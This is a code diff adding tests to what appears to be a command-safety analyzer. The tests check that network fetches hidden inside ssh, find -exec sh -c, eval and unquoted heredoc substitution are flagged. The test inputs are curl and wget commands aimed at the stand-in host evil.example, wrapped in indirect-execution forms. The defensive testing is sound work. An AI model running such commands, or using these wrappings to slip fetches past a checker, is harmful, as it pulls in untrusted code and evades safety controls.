@@ -528,6 +528,20 @@ for (const wrappedMore of [
 ]) {
   assert.ok(analyzeCommand(wrappedMore).reasons.some(reason => reason.code === 'unknown-link'), `包装形式应识别 fetch：${wrappedMore}`)
 }
+// 带取值选项的 ssh、find -exec 里的 shell、eval 的引号分组都要还原成真实命令
+for (const indirect of [
+  'ssh -p 22 host curl http://evil.example/a',
+  "ssh host 'curl http://evil.example/a'",
+  "find . -exec sh -c 'curl http://evil.example/a' \\;",
+  "find . -name x -exec sh -c 'wget http://evil.example/a' {} \\;",
+  'eval \'curl -H "a b" http://evil.example/a\'',
+]) {
+  assert.ok(analyzeCommand(indirect).reasons.some(reason => reason.code === 'unknown-link'), `间接执行应识别 fetch：${indirect}`)
+}
+// 未加引号的 heredoc 终止符会在正文里做命令替换：替换里的 fetch 会执行，文字链接不会
+assert.ok(analyzeCommand(['cat > f <<EOF', '$(curl http://evil.example/a)', 'EOF'].join('\n')).reasons.some(reason => reason.code === 'unknown-link'))
+assert.equal(analyzeCommand(["cat > f <<'EOF'", '$(curl http://evil.example/a)', 'EOF'].join('\n')).risk, false)
+assert.equal(analyzeCommand(['cat > f <<EOF', 'text https://other.example/x', 'EOF'].join('\n')).risk, false)
 const persistedRules = await ruleStore.list()
 assert.ok(persistedRules.some(rule => rule.kind === 'command'))
 assert.ok(persistedRules.some(rule => rule.kind === 'host' && rule.host === 'evil.example'))
